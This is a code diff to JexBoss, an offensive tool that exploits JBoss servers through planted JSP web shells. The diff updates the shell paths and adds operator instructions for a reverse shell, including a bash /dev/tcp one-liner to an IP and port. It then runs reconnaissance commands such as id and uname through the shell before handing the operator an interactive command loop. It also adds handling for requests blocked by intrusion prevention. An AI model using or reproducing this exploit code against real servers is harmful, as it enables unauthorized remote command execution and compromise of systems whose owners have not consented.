@@ -38,7 +38,7 @@ FORMAT = "%(asctime)s (%(levelname)s): %(message)s"
 logging.basicConfig(filename='jexboss_'+str(datetime.datetime.today().date())+'.log', format=FORMAT, level=logging.INFO)
 
 __author__ = "João Filho Matos Figueiredo <joaomatosf@gmail.com>"
-__version = "1.0.17"
+__version = "1.1.2"
 
 RED = '\x1b[91m'
 RED1 = '\033[31m'
@@ -312,26 +312,45 @@ def shell_http(url, shell_type):
                "User-Agent": get_random_user_agent()}
 
     if gl_args.disable_check_updates:
-        headers['check-updates'] = 'false'
+        headers['no-check-updates'] = 'true'
 
     if shell_type == "jmx-console" or shell_type == "web-console" or shell_type == "admin-console":
-        path = '/jexws3/jexws3.jsp?'
+        path = '/jexws4/jexws4.jsp?'
     elif shell_type == "JMXInvokerServlet":
-        path = '/jexinv3/jexinv3.jsp?'
+        path = '/jexinv4/jexinv4.jsp?'
 
     gl_http_pool.request('GET', url+path, redirect=False, headers=headers)
 
     sleep(7)
     resp = ""
-    print_and_flush(" * - - - - - - - - - - - - - - - - - - - - LOL - - - - - - - - - - - - - - - - - - - - * \n")
+    print_and_flush("# ----------------------------------------- # LOL # ----------------------------------------- #\n")
     print_and_flush(RED + " * " + url + ": \n" + ENDC)
+    print_and_flush("# ----------------------------------------- #\n")
+    print_and_flush(GREEN + BOLD + " * For a Reverse Shell (like meterpreter =]), type the command: \n\n"
+                                   "   jexremote=YOUR_IP:YOUR_PORT\n\n" + ENDC + GREEN +
+                    "   Example:\n" +ENDC+
+                    "     Shell>jexremote=192.168.0.10:4444\n"
+                    "\n" +GREEN+
+                    "   Or use other techniques of your choice, like:\n" +ENDC+
+                    "     Shell>/bin/bash -i > /dev/tcp/192.168.0.10/4444 0>&1 2>&1\n"
+                    "   \n"+GREEN+
+                    "   And so on... =]\n" +ENDC
+                    )
+    print_and_flush("# ----------------------------------------- #\n")
 
     for cmd in ['uname -a', 'cat /etc/issue', 'id']:
         cmd = urlencode({"ppp": cmd})
-        r = gl_http_pool.request('GET', url + path + cmd, redirect=False, headers=headers)
-        resp += " " + str(r.data).split(">")[1]
+        try:
+            r = gl_http_pool.request('GET', url + path + cmd, redirect=False, headers=headers)
+            resp += " " + str(r.data).split(">")[1]
+        except:
+            print_and_flush(RED + " * Apparently an IPS is blocking some requests. Check for updates will be disabled...\n\n"+ENDC)
+            logging.warning("Disabling checking for updates.", exc_info=traceback)
+            headers['no-check-updates'] = 'true'
+
     print_and_flush(resp.replace('\\n', '\n'), same_line=True)
     logging.info("Server %s exploited!" %url)
+
     while 1:
         print_and_flush(BLUE + "[Type commands or \"exit\" to finish]" +ENDC)
 
